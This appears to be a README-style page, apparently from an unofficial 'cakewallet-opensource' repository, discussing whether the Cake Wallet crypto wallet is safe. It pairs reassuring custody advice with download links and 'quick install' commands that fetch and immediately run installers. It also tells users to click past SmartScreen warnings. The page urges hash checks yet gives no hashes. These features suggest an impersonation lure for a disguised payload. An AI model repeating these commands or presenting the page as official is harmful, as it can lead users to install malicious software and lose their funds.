![Cake Wallet safe custody keys guide](assets/cake-wallet-safe-custody-keys-article-banner.png)

# Is Cake Wallet Safe? Custody, Keys and Code

What protects your funds, what protects nothing, and how to check the file.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Cake Wallet is non-custodial and open source under the MIT licence: the keys stay on your device, the project cannot freeze or recover funds, and your recovery phrase is the only way back. Nobody else can take your XMR, and nobody can restore it if the phrase is lost. That is the honest trade at the centre of every safety question.

<!-- ARTICLE-BODY-BEGIN -->

## Who holds the keys
The wallet generates keys on your device and keeps them there, encrypted behind your PIN. There is no account to log into and no server that holds a copy, which is why the project cannot move, freeze or refund anything.

That is also why a lost phrase is final. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-what-it-is.md">What Cake Wallet is</a> covers the product and its maker, so you can judge the organisation as well as the software.

## Your responsibility is the backup
Every safety property in a self-custody wallet ends at your backup. A phone that dies, a laptop that is stolen, a PIN forgotten: all three are recoverable from the phrase and none is recoverable without it.

Write it down, keep it offline, and test it once. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-backup-recovery-phrase.md">Back up your Cake Wallet phrase</a> explains how to prove a backup works before you need it, which is the only step that turns a note into a backup.

## How the code is checked
The wallet is open source and the licence is MIT, read from the repository's licence file rather than from marketing. Open source means the code can be inspected, not that it has been proven free of bugs by inspection.

Release assets carry published hashes, and the desktop releases are built from tagged source. A hash comparison tells you the file is the one the project published; it does not tell you the code is perfect.

## Verify before you install
The most common real-world loss is not a broken wallet but a fake one: a clone listing, a mirror, a "support" account asking for your phrase. Install from the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">current Cake Wallet release</a> or the official store listing, and compare the desktop installer's hash.

No legitimate support channel will ever ask for your recovery phrase. A message that does is impersonation, whatever it claims.

## What an audit does not cover
Privacy claims and custody claims are separate. The wallet needs no identity, but a card purchase through a provider does, and that record exists outside the app.

<a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-kyc-anonymous.md">Cake Wallet KYC</a> separates the wallet, the provider and the chain, which keeps "safe" from being read as "anonymous" when those are two different questions.

## How it compares
Safety is not a single score. A wallet that holds your keys removes counterparty risk and adds backup risk; a custodial app does the reverse. The comparison page lays the trade-offs side by side without declaring a winner.

<a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-comparison-trust-wallet.md">Cake Wallet comparison</a> keeps the whole-map competitor rule: one neutral table, no verdict, so the decision stays with you.

## FAQ
### Is Cake Wallet open source?
Yes, and the repository's licence file is MIT. You can read the code that builds the app.
### Is Cake Wallet legit or a scam?
It is a published open-source project with public releases and hashes, which is what makes it reputable and trusted in the narrow sense that the code can be checked. Treat unsolicited "Cake Wallet support" messages as impersonation regardless.
### How secure is Cake Wallet?
Secure in the custody sense: keys stay on your device and nobody else can move funds. The remaining risk is your own backup and the device itself, which no wallet can remove.
### Can a crypto wallet be hacked?
A phone wallet can be compromised by malware or a stolen PIN. A paper backup cannot be hacked online but can be lost or photographed.
### Has Cake Wallet had a security incident?
The historical weak-randomness issue in 2021 Bitcoin seeds was fixed in v4.1.7 and is not an open risk in current builds. No claim beyond that is made here.
### Is Cake Wallet safe for Monero in 2026?
Custody is yours and the phrase is the recovery path. Monero's own privacy is a protocol property, independent of the app.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[what Cake Wallet is](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-what-it-is.md) · [back up your Cake Wallet phrase](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-backup-recovery-phrase.md) · [Cake Wallet KYC](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-kyc-anonymous.md) · [Cake Wallet comparison](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-comparison-trust-wallet.md) · [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
